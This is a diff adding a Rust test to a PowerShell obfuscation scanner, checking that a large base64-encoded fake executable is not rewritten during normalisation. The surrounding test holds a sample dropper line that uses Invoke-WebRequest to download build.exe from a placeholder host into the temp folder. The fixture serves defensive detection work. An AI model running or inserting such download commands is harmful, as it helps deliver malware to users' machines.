@@ -12810,6 +12810,28 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_does_not_substitute_large_binary_base64_literal() {
+        use base64::Engine;
+
+        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
+        binary.extend((0..=255).cycle().take(12_000));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
+        let ps = format!("$buf = [Convert]::FromBase64String('{b64}')");
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("FromBase64String"),
+            "large binary base64 literal should not be substituted:\n{}",
+            normalized
+        );
+        assert_eq!(
+            normalized.matches(&b64).count(),
+            1,
+            "large base64 literal should remain a single encoded carrier:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_convert_base64_unwraps_nested_script() {
         use base64::Engine;
         let decoded = r#"$url = "https://biteblob.example/Download/build.exe"; Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\file.exe""#;
